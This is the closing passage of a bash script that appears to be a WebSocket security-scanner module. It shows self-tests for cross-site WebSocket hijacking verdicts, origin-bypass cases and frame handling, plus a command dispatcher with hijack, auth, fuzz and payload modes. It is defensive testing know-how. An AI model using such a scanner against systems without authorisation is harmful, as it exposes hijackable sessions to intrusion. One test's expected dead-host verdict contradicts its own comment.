    chk cv-unreach     "$(ws_cswsh_verdict foreign-origin 000 no no)" "unreachable"
    chk cv-rejected    "$(ws_cswsh_verdict foreign-origin 403 no yes)" "rejected"
    chk cv-cookie      "$(ws_cswsh_verdict foreign-origin 101 yes yes)" "cswsh-cookie"
    chk cv-anon        "$(ws_cswsh_verdict foreign-origin 101 yes no)" "cswsh-anonymous"
    chk cv-null        "$(ws_cswsh_verdict null-origin 101 yes yes)" "null-accepted"
    chk cv-regex       "$(ws_cswsh_verdict prefix-suffix 101 yes yes)" "regex-bypass"
    chk cv-control     "$(ws_cswsh_verdict same-origin 101 yes yes)" "control-ok"

    chk mv-closed      "$(ws_message_verdict 0 8 2 "")" "closed"
    chk mv-data        "$(ws_message_verdict 0 1 12 '{"ok":1}')" "data"
    chk mv-refused     "$(ws_message_verdict 0 1 20 'unauthorized')" "refused-in-message"
    chk mv-binary      "$(ws_message_verdict 0 2 12 "")" "binary-data"
    chk mv-noreply     "$(ws_message_verdict 0 0 0 "")" "no-reply"

    # the request must end with a real double CRLF or a server waits forever
    local rf; rf="$(mktemp "$CS_SCRATCH/wsr.XXXXXX")" 2>/dev/null || rf="$OUT_DIR/.r.$$"
    local hb; hb="$(mktemp "$CS_SCRATCH/wshb.XXXXXX")" 2>/dev/null || hb="$OUT_DIR/.hb.$$"
    # '>' truncates and '>>' appends; using '>' twice leaves only the frame
    printf 'GET / HTTP/1.1\r\nHost: x\r\n\r\n' > "$rf"
    printf '\x81\x05hello' >> "$rf"
    ws_split_headers "$rf" "$hb"
    chk split-body    "$(od -An -tx1 -N1 "$hb" 2>/dev/null | tr -d ' \n')" "81"
    chk split-len     "$(wc -c < "$hb" | tr -d ' ')" "7"
    chk split-headers "$(head -c 8 "$rf" | od -An -c | tr -d ' \n')" "GET/HT"

    # a dead host is unreachable, never a finding
    local out
    out="$(ws_cmd_auth 127.0.0.1 9 /ws 0 2>/dev/null)"
    chk dead-verdict   "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "requires-credential"
    chk dead-hits      "$(printf '%s' "$out" | grep -c '^websocket-no-auth')" "0"

    # usage errors, not crashes
    ws_cmd_discover 2>/dev/null;  chk dis-usage "$?" "2"
    ws_cmd_handshake 2>/dev/null; chk hs-usage  "$?" "2"
    ws_cmd_auth 2>/dev/null;      chk auth-usage "$?" "2"
    ws_cmd_cswsh 2>/dev/null;     chk csw-usage "$?" "2"
    ws_cmd_messages 2>/dev/null;  chk msg-usage "$?" "2"
    ws_cmd_fuzz 2>/dev/null;      chk fuz-usage "$?" "2"

    # shape contracts
    chk status-fields  "$(ws_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module  "$(ws_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields    "$(ws_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first     "$(ws_cmd_help | head -1 | grep -ci 'WebSocket')" "1"
    chk paths-rows     "$(ws_cmd_paths | grep -c '^PATH')" "$n"
    chk origins-rows   "$(ws_cmd_origins | grep -c '^ORIGIN')" "12"
    chk frames-rows    "$(ws_cmd_frames | grep -c '^OPCODE')" "6"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --discover)   shift; ws_cmd_discover "$@";;
    --handshake)  shift; ws_cmd_handshake "$@";;
    --auth)       shift; ws_cmd_auth "$@";;
    --cswsh)      shift; ws_cmd_cswsh "$@";;
    --messages)   shift; ws_cmd_messages "$@";;
    --fuzz)       shift; ws_cmd_fuzz "$@";;
    --paths)      ws_cmd_paths;;
    --origins)    ws_cmd_origins;;
    --payloads)   ws_cmd_payloads;;
    --frames)     ws_cmd_frames;;
    --list)       ws_cmd_origins;;
    --status-tsv|--status) ws_cmd_status_tsv;;
    --menu)       ws_cmd_menu;;
    --selftest)   ws_selftest;;
    *)            ws_cmd_help;;
esac
